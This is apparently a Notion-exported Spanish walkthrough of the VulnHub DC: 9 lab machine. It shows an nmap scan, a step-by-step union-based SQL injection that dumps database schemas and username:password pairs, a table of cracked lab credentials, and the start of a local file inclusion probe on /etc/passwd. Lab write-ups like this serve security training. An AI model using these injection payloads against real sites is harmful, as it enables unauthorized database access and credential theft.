@@ -1,0 +1,796 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><link rel="icon" type="image/x-icon" href="assets/DC9.png" /><title>DC: 9</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body style="background-color: #E5E8E8"><article id="01164cdd-46bf-416d-b8b4-39c5ae39edd1" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_winslow_homer_maine_coast.jpg" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/package_orange.svg"/></div><h1 class="page-title">DC: 9</h1></header><div class="page-body"><p id="a83240e9-e9b7-40a1-acb1-ba3d8c542003" class="">
+</p><p id="185c7ba2-dec9-4887-8657-563c5ef334b7" class=""><a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p><hr id="28676b4c-09a9-44b9-ae65-69c839e6912a"/><h3 id="2619a762-ade5-424b-b1b7-83d21f43d480" class=""><mark class="highlight-blue">Intrusion</mark></h3><p id="18873791-26f0-4ba1-a80d-ad7f920449ad" class="">Escaneo con Nmap para descubrir puertos abiertos en la máquina.</p><pre id="6458ab6c-f8e0-493b-a729-6bd428e7a4c7" class="code"><code>❯ nmap 192.168.1.17
+Nmap scan report for 192.168.1.17
+Host is up (0.0010s latency).
+PORT   STATE SERVICE
+22/tcp filtered ssh
+80/tcp open  http</code></pre><ul id="c32a542d-423d-4295-a73c-5f256cfc4283" class="bulleted-list"><li style="list-style-type:disc">80/tcp open http Apache httpd 2.4.38 ((Debian))</li></ul><ul id="e58cd6a9-b1fb-4e1d-9246-4b560be4bbbd" class="bulleted-list"><li style="list-style-type:disc">22/tcp filtered ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</li></ul><figure id="fff56b24-a3e9-4d1d-b8f3-6808905b2cc9" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled.png"><img style="width:912px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled.png"/></a></figure><p id="25c829c7-dfea-4de5-b68c-f01ec12c73f2" class="">En el apartado Search podemos buscar detalles de los usuarios, y en Manage podemos iniciar sesion con un usuario, pero sin credenciales por el momento no podemos hacer nada.</p><p id="ce74cb6e-9a21-4665-b7c2-18a6655f5498" class="">Si intentamos una SQLi en el panel de inicio de sesión no hay resultado, pero si probamos en el panel de “Search”, al enviar <mark class="highlight-gray_background">‘ or 1=1-- -</mark> nos devuelve los detalles de todos los usuarios.</p><figure id="15aaddca-6545-44a8-a76f-632a873c5594" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%201.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%201.png"/></a></figure><p id="57ff5da8-cc27-481d-9f94-781c7b99b32f" class="">En este punto podríamos intentar ver usuarios y contraseñas de la base de datos a través de una SQL injection, pero antes hay que enumerarla.</p><p id="566af426-de70-4bb0-8433-4cc866f40726" class="">Primero hay que determinar la cantidad de columnas que se devuelven de la consulta original.</p><p id="de4699db-392b-4957-8e8f-92b7675c8c97" class="">
+</p><p id="69461e05-d2ae-4842-9414-fdf5470c6177" class="">Al mandar un payload de diferentes valores nulos y que la cantidad de columnas no coincida con el payload, la base de datos arrojará un error. Por lo tanto, si vamos probando diferentes valores y no da error, encontramos la cantidad de columnas.</p><pre id="e5de3315-de70-470c-ba67-0fbe3a9f0d77" class="code"><code>admin&#x27; union select 1,2,3,4,5,6-- -</code></pre><figure id="43c7381a-ebcd-4dd7-9ffe-486dabc089bb" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%202.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%202.png"/></a></figure><p id="0ec0d780-1c72-46f5-8169-66eeb6f30397" class="">El objetivo ahora es poder ver resultados de la consulta inyectada. Dado que los datos interesantes suelen estar en formato string, debemos encontrar una o más columnas que sean de tipo strings para poder recuperar datos.</p><pre id="e5b8d492-467c-40e8-b774-2c7b88e97678" class="code"><code>admin&#x27; union select &#x27;test&#x27;,2,3,4,5,6-- -</code></pre><figure id="c22a432b-44c2-4330-bf40-0ce753603677" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%203.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%203.png"/></a></figure><p id="ba09c04e-2ead-4fb6-aa3c-7fa2592a73c8" class="">Ahora que la columna también es formato string, podemos empezar a recuperar datos de otras tablas.</p><p id="28ab9e9b-4424-4fba-9f00-90c905b1af2a" class="">Primero, podemos enumerar las bases de datos.</p><pre id="91ac3dc8-043f-4ad1-aa09-264da607f2df" class="code"><code>admin&#x27; union select group_concat(schema_name),2,3,4,5,6 from information_schema.schemata-- -</code></pre><figure id="2cf63237-ebd2-4ccd-8eb8-71084b0409c5" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%204.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%204.png"/></a></figure><p id="905144c3-0ffd-4afb-9f79-6ac7a7a00f78" class="">Primero vamos a enumerar la base de datos ‘Staff’ que es la que está en uso y después vamos por la de ‘users’.</p><pre id="1b088090-7a37-4390-b30a-0afdc185aaa6" class="code"><code>admin&#x27; union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=&quot;Staff&quot;-- -</code></pre><p id="4535ec00-eacd-4fdd-a727-a1188b3e1d82" class="">
+</p><figure id="ed21b1b6-10b1-4fad-80ff-c8ade88cb4ab" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%205.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%205.png"/></a></figure><p id="3696c1cf-ad96-49c3-bc7b-5f34c7321c5d" class="">Ahora podríamos tratar de leer las columnas de la tabla ‘Users’ de la base de datos ‘Staff’.</p><pre id="0a42ba1d-9945-4b52-9250-c416b55dcc55" class="code"><code>admin&#x27; union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_schema=&quot;Staff&quot; and table_name=&quot;Users&quot;-- -</code></pre><figure id="4e92bc6e-529c-40c2-8456-a10dd5b38475" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%206.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%206.png"/></a></figure><p id="2645c82b-dcd5-4425-87b9-dc8b82a9de7d" class="">Y ahora, con las columnas, podríamos tartar de extraer la data de cada una. Aunque las más importantes generalmente son “username” y “password”. </p><pre id="c2beb252-fe36-403a-b890-638df0c44646" class="code"><code>admin&#x27; union select group_concat(Username,&quot;:&quot;,Password),2,3,4,5,6 from Users-- -</code></pre><p id="26a2eeb5-b9ea-47a4-8bd3-42ee95df8785" class="">
+</p><figure id="e1d53599-3d8f-4d66-9827-eb1cacc2f9a7" class="image"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%207.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%207.png"/></a></figure><p id="1d226e14-e7c8-4ab2-bad3-bab01e05fc66" class="">Ahora tenemos un usuario y un hash de una contraseña. Si la pasamos por crackstation nos da una contraseña en texto claro.</p><figure id="5b5afec6-8b1f-4f6b-9e9e-730617fe32ee" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%208.png"><img style="width:768px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%208.png"/></a></figure><p id="b95a23cd-0adc-437b-9f99-6bf20fa7e9a4" class="">Con esas credenciales, ahora sí, podemos conectarnos en el panel.</p><figure id="82196d46-6aef-432b-a0ec-2cf3aa02fe14" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%209.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%209.png"/></a></figure><p id="b6c6c3f3-cad6-4702-9830-c5e6aed52ddb" class="">Pero antes de probar nada, queda enumera la base de datos ‘users’.</p><pre id="cb593943-7e9f-4ce7-9556-39d487758629" class="code"><code>admin&#x27; union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=&quot;users&quot;-- -</code></pre><figure id="2a252fb4-dcda-4a60-bcb7-60f0ac8cbe03" class="image" style="text-align:center"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2010.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2010.png"/></a></figure><pre id="bf485569-d3f5-4fb3-a275-7140e524e822" class="code"><code>admin&#x27; union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_schema=&quot;users&quot; and table_name=&quot;UserDetails&quot;-- -</code></pre><figure id="d7dc3512-7e22-41fe-a055-ddb92911c732" class="image"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2011.png"><img style="width:576px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2011.png"/></a></figure><pre id="52f84893-4f37-4e87-8eea-d94e0499af75" class="code"><code>admin&#x27; union select group_concat(username,&quot;:&quot;,password),2,3,4,5,6 from users.UserDetails-- -</code></pre><figure id="b26ccdca-62b4-43e2-a584-d31d20471f19" class="image"><a href="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2012.png"><img style="width:651px" src="DC%209%2001164cdd46bf416db8b439c5ae39edd1/Untitled%2012.png"/></a></figure><table id="83122419-6bb4-41e4-b4ca-abf5976974ec" class="simple-table"><tbody><tr id="e811de05-4c79-4247-afab-f7412c5ddee9"><td id="O@pa" class=""><span style="border-bottom:0.05em solid">Username</span></td><td id="cRiQ" class=""><span style="border-bottom:0.05em solid">Password</span></td></tr><tr id="1668f227-e0db-45c1-80ed-9dcea9b37c7a"><td id="O@pa" class="">marym </td><td id="cRiQ" class="">3kfs86sfd </td></tr><tr id="fb767b0f-3374-4462-9635-e5aabcb5c51a"><td id="O@pa" class="">julied </td><td id="cRiQ" class="">468sfdfsd2</td></tr><tr id="60b45579-f4be-482c-8da7-3e04a80c772a"><td id="O@pa" class="">fredf </td><td id="cRiQ" class="">4sfd87sfd1</td></tr><tr id="187cecdc-2ee7-43d7-a7fc-208c7608651f"><td id="O@pa" class="">barneyr </td><td id="cRiQ" class="">RocksOff</td></tr><tr id="dc25a266-9d87-42fc-b75a-7080bf741c5c"><td id="O@pa" class="">tomc </td><td id="cRiQ" class="">TC&amp;TheBoyz</td></tr><tr id="05c903d2-469a-454c-b216-430505e48096"><td id="O@pa" class="">jerrym </td><td id="cRiQ" class="">B8m#48sd</td></tr><tr id="2b9301f6-ef54-4d3c-acae-531a4355ab2f"><td id="O@pa" class="">wilmaf </td><td id="cRiQ" class="">Pebbles</td></tr><tr id="8b15760a-8d0f-4030-9671-c6ee06a8bd84"><td id="O@pa" class="">bettyr </td><td id="cRiQ" class="">BamBam01</td></tr><tr id="6344aaed-46e1-415d-af8b-9315038f4f68"><td id="O@pa" class="">chandlerb </td><td id="cRiQ" class="">UrAG0D!</td></tr><tr id="3fda3fa0-9918-4ff0-9ac6-d323fe9a7d43"><td id="O@pa" class="">joeyt </td><td id="cRiQ" class="">Passw0rd</td></tr><tr id="18225196-8e43-44f1-94fd-8ad553d207ee"><td id="O@pa" class="">rachelg </td><td id="cRiQ" class=""> yN72#dsd</td></tr><tr id="06cf6439-fb69-4e0b-898c-64f2db9ef942"><td id="O@pa" class="">rossg </td><td id="cRiQ" class="">ILoveRachel</td></tr><tr id="d509464c-1af8-4fa3-90ca-647e7e4dd80b"><td id="O@pa" class="">monicag </td><td id="cRiQ" class="">3248dsds7s</td></tr><tr id="ecb9f263-5218-4ab3-b077-a10cad49f773"><td id="O@pa" class="">phoebeb </td><td id="cRiQ" class="">smellycats</td></tr><tr id="3e4aae39-f934-433a-b118-66fda377dc4d"><td id="O@pa" class="">scoots </td><td id="cRiQ" class="">YR3BVxxxw87</td></tr><tr id="dfcfb2e9-ba7d-4321-86f7-32553744cc2c"><td id="O@pa" class="">janitor </td><td id="cRiQ" class="">Ilovepeepee</td></tr><tr id="9b76fdf9-6723-4cbd-b4c4-6969ce029df9"><td id="O@pa" class="">janitor2</td><td id="cRiQ" class="">Hawaii-Five-0</td></tr></tbody></table><p id="a2da26a0-7c92-46f1-9815-9483b1e47c76" class="">Si volvemos a ver la imagen cuando nos conectamos, había un mensaje que decía “<mark class="highlight-red_background">File does not exist“</mark>, y como sabemos ‘file’ es un típico parámetro para probar en las “Local File Inclusion”. Podemos intentamos ver el “/etc/passwd”.</p><figure id="c5aebff4-ad05-4029-9416-00d3447d8f3b" class="image" style="text-align:center"><a 